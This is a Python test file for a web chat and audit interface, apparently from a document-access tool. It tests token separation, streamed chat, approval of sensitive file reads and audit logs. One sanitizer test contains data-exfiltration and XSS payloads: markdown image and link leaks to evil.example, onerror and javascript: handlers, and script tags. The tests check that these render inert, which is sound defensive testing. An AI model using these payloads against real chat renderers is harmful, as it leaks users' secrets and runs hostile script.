"""Web UI (htmx) tests: token separation, chat streaming, confirm flow,
audit console. The chat brain is stubbed so everything runs offline."""

import json
import os
import sys
import tempfile
import types
from pathlib import Path

_TMP = tempfile.mkdtemp(prefix="fileguard-web-")
os.environ["FILEGUARD_DATA_DIR"] = _TMP
os.environ["FILEGUARD_GATEKEEPER_MODE"] = "test"

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pytest  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

import ui.web as web  # noqa: E402
from fileguard import db  # noqa: E402


@pytest.fixture(scope="module", autouse=True)
def seeded():
    from scripts import ingest_demo, seed

    seed.main()
    ingest_demo.main()


# --- scripted brain used for chat-flow tests ----------------------------------


def _install_scripted_brain(calls):
    state = {"i": 0}
    received_list = []

    class StubHarness:
        received = received_list  # same list; tests read Stub.received

        def __init__(self, grant, **kw):
            self.st = types.SimpleNamespace(grant=grant, pending=None)
            self.client = None  # unused by the stub
            self.messages = []

        def chat(self, user_input, on_stage=None, default_clearance=None):
            received_list.append(default_clearance)
            if on_stage:
                on_stage("Checking available files…")
            if state["i"] < len(calls):
                call = calls[state["i"]]
                state["i"] += 1
                if call.get("park"):
                    out = {"status": "pending_confirmation",
                           "tier": call["tier"], "summary": call["summary"],
                           "file_name": call["file_name"], "tool": "get_content",
                           "payload": {"args": call, "tier": call["tier"]}}
                    self.st.pending = out
                    return out
            return {"status": "done", "answer": "Scripted answer."}

        def resume(self, approved, on_stage=None):
            self.st.pending = None
            if not approved:
                return {"status": "done", "answer": "Cancelled."}
            return {"status": "done", "answer": "Approved answer."}

    web.AssistantHarness = StubHarness
    return StubHarness


@pytest.fixture()
def client():
    return TestClient(web.app)


def _login(client, token):
    return client.post("/login", data={"token": token},
                       follow_redirects=False)


def _parse_sse(body: str):
    events = []
    for frame in body.split("\n\n"):
        ev, data = None, ""
        for line in frame.splitlines():
            if line.startswith("event: "):
                ev = line[7:].strip()
            elif line.startswith("data: "):
                data += line[6:]
        if ev:
            events.append((ev, json.loads(data) if data else {}))
    return events


# --- login / token separation ----------------------------------------------------


def test_chat_login_sets_cookie(client, seeded):
    r = _login(client, "token-bob")
    assert r.status_code == 200
    assert "fg_user" in r.cookies


def test_chat_page_renders_when_signed_in(client, seeded):
    """Regression: the signed-in chat page renders the sidebar profile card."""
    _login(client, "token-alice")
    r = client.get("/")
    assert r.status_code == 200
    assert "Alice" in r.text and "HR Lead" in r.text


def test_audit_token_rejected_on_chat(client, seeded):
    r = _login(client, "audit-token-topsecret")
    assert r.status_code == 401
    assert "Audit tokens do not work" in r.text


def test_chat_token_rejected_on_audit(client, seeded):
    r = client.post("/audit/login", data={"token": "token-bob"})
    assert r.status_code == 401
    assert "Chat tokens do not work" in r.text


def test_audit_login_levels(client, seeded):
    r = client.post("/audit/login", data={"token": "audit-token-standard"})
    assert r.status_code == 200 and "fg_audit" in r.cookies


# --- chat streaming flow -----------------------------------------------------------


def test_chat_stream_done(client, seeded):
    _install_scripted_brain([])
    _login(client, "token-bob")
    r = client.post("/chat", data={"message": "what is the hr policy?"})
    events = dict(_parse_sse(r.text))
    assert "user" in events and "stage" in events and "messages" in events and "end" in events
    assert "Scripted answer." in events["messages"]["html"]


def test_chat_park_then_confirm_shows_file_name(client, seeded):
    _install_scripted_brain([{
        "park": True, "tier": "top_secret",
        "summary": "get_content hr_incident_report.docx",
        "file_name": "hr_incident_report.docx",
        "file_ref": "837072e20e41", "reason": "incident"}])
    _login(client, "token-alice")
    r = client.post("/chat", data={"message": "read the incident report"})
    events = dict(_parse_sse(r.text))
    html = events["messages"]["html"]
    assert "hr_incident_report.docx" in html, "confirmation must show the real file name"
    assert "779e10e0402cad72" not in html, "must not show a hash"
    # the card posts a single deterministic value via hx-vals
    assert 'hx-vals' in html and 'hx-include' not in html

    # approve via the htmx endpoint
    r2 = client.post("/confirm", data={"approved": "true"})
    assert r2.status_code == 200
    assert "Approved answer." in r2.text


def test_confirm_tolerates_duplicate_values(client, seeded):
    """Legacy browser payloads could include approved=true&approved=false —
    the first value must win instead of a 422."""
    _install_scripted_brain([{
        "park": True, "tier": "top_secret",
        "summary": "get_content hr_incident_report.docx",
        "file_name": "hr_incident_report.docx", "file_ref": "x", "reason": "r"}])
    _login(client, "token-alice")
    client.post("/chat", data={"message": "read the incident report"})
    r = client.post("/confirm", content="approved=true&approved=false",
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
    assert r.status_code == 200
    assert "Approved answer." in r.text


def test_chat_while_pending_is_refused(client, seeded):
    _install_scripted_brain([{
        "park": True, "tier": "top_secret",
        "summary": "get_content hr_incident_report.docx",
        "file_name": "hr_incident_report.docx", "file_ref": "x", "reason": "r"}])
    _login(client, "token-alice")
    client.post("/chat", data={"message": "read the incident report"})
    r = client.post("/chat", data={"message": "second question"})
    events = dict(_parse_sse(r.text))
    assert "approve or deny the pending confirmation" in events["messages"]["html"].lower()


def test_chat_requires_login(client, seeded):
    r = client.post("/chat", data={"message": "hi"})
    assert r.status_code == 401


# --- audit console -----------------------------------------------------------------


def test_audit_entries_requires_audit_session(client, seeded):
    assert client.get("/audit/panel?view=log").status_code == 401
    client.post("/audit/login", data={"token": "audit-token-standard"})
    r = client.get("/audit/panel?view=log")
    assert r.status_code == 200


def test_audit_page_renders_rows_with_file_names(client, seeded):
    grant = client.post("/login", data={"token": "token-bob"}).cookies
    r = client.post("/v1/request" if False else "/audit/login",
                    data={"token": "audit-token-topsecret"})
    page = client.get("/audit")
    assert page.status_code == 200
    # create at least one entry so rows render
    client.post("/audit/login", data={"token": "audit-token-topsecret"})
    rows = client.get("/audit/panel?view=log")
    assert rows.status_code == 200


def test_default_clearance_flows_and_clamps(client, seeded):
    Stub = _install_scripted_brain([])
    _login(client, "token-bob")  # confidential max

    r = client.post("/chat", data={"message": "find finance docs",
                                   "default_clearance": "confidential"})
    assert r.status_code == 200
    assert Stub.received[-1] == "confidential"

    # a tampered client sending above the user's max is clamped to the max
    client.post("/chat", data={"message": "find finance docs",
                               "default_clearance": "top_secret"})
    assert Stub.received[-1] == "confidential"

    # nonsense value clamps to the user's max as well
    client.post("/chat", data={"message": "find finance docs",
                               "default_clearance": "bogus"})
    assert Stub.received[-1] == "confidential"



# --- C2: answer sanitization + strict CSP -------------------------------------

def test_md_html_strips_exfiltration_channels():
    from ui.web import md_html
    out = md_html('![x][1]\n\n[1]: https://evil.example/?leak=SECRET')
    assert "img" not in out and "evil.example" not in out
    out = md_html('<img src="https://evil.example/x" onerror="alert(1)">')
    assert "<img" not in out   # escaped to inert text, no live tag
    out = md_html('<https://evil.example/?leak=SECRET>')
    assert "<a" not in out and "href" not in out
    out = md_html('[click me](https://evil.example/?leak=SECRET)')
    assert "<a" not in out and "href" not in out
    out = md_html('[x](javascript:alert(1))')
    assert "javascript:" not in out
    out = md_html('<script>alert(1)</script><b>hi</b>')
    assert "<script" not in out and "&lt;script&gt;" in out  # inert text
    out = md_html('**bold** and `code`\n\n- item')
    assert "<strong>bold</strong>" in out and "<code>code</code>" in out
    assert "<li>item</li>" in out


def test_csp_header_on_all_pages(client, seeded):
    for path in ("/", "/audit", "/upload"):
        r = client.get(path)
        csp = r.headers.get("content-security-policy", "")
        assert "default-src 'none'" in csp and "script-src 'self'" in csp
    for path in ("/", "/audit"):
        assert "<script>" not in client.get(path).text


def test_md_html_renders_pipe_tables():
    from ui.web import md_html
    html = md_html("| A | B |\n|---|---|\n| 1 | 2 |")
    assert "<table>" in html and "<td>" in html


def test_assistant_message_metas_from_sources():
    # the done-result's per-turn `sources` list is the source of truth for
    # the delivery chips/boxes
    from ui import web
    msg = web._assistant_message({
        "answer": "text",
        "sources": [{"name": "f", "container": "SEC", "delivery": "stitched",
                     "body": "delivered text", "receipt": True}],
        "receipts": [{"payload": {"file_name": "f", "platform": "jira",
                                  "grounding_level": "verified"}}],
        "searches": [], "source_files": ["f"],
    })
    meta = msg["source_metas"][0]
    assert meta["container"] == "SEC" and meta["delivery"] == "stitched"
    assert meta["body"] == "delivered text" and meta["receipt"] is True


def test_stitched_chip_and_box_render():
    from ui.web import _message_html
    html = _message_html({
        "role": "assistant", "text": "answer",
        "searches": [], "sources": 0, "source_files": [],
        "source_metas": [{"name": "SEC-24", "platform": "jira",
                          "container": "SEC", "delivery": "stitched",
                          "body": "findings <script>alert(1)</script> more"}],
    })
    assert '>stitched</span>' in html and 'data-src="0"' in html
    assert 'class="cite-box" data-src="0" hidden' in html
    assert "SEC-24" in html and "/SEC" in html
    # untrusted delivered text must be escaped, not rendered
    assert "<script>" not in html
    assert "&lt;script&gt;" in html


def test_excerpt_chip_and_continuous_body():
    from ui.web import _message_html
    html = _message_html({
        "role": "assistant", "text": "answer",
        "searches": [], "sources": 0, "source_files": [],
        "source_metas": [{"name": "CF-RUNBOOK", "platform": "confluence",
                          "container": "PAY-DOCS", "delivery": "excerpt",
                          "body": "step 1\n\nstep 2 (continuous content)"}],
    })
    assert ">excerpt</span>" in html
    assert "step 1" in html and "step 2" in html
    assert "(...)" not in html  # continuous delivery has no gap marker


def test_no_content_chip_is_dimmed_but_present():
    from ui.web import _message_html
    html = _message_html({
        "role": "assistant", "text": "answer",
        "searches": [], "sources": 0, "source_files": [],
        "source_metas": [{"name": "f", "platform": "jira",
                          "delivery": "none", "body": ""}],
    })
    assert ">no content</span>" in html
    assert "empty" in html  # dimmed styling


def test_detail_shows_covering_checkpoint_number(client, seeded):
    """Detail panel of any entry must render the seq of the checkpoint that
    covers it — payloads carry no seq, the row does (regression: '#')."""
    from fileguard import checkpoint
    conn = db.central()
    try:
        s1 = db.append_log(conn, {"event": "request", "user_id": "bob",
                                  "tool": "search", "reason": "t"})["seq"]
        s2 = db.append_log(conn, {"event": "request", "user_id": "bob",
                                  "tool": "search", "reason": "t"})["seq"]
        cp = checkpoint.make_checkpoint(conn)
        assert cp and cp["seq"]
        cp_seq = cp["seq"]
    finally:
        conn.close()
    client.post("/audit/login", data={"token": "audit-token-topsecret"})
    for s in (s1, s2):
        # only the new checkpoint covers these — assert its number renders
        r = client.get(f"/audit/detail/{s}")
        assert f"checkpoint #{cp_seq}" in r.text
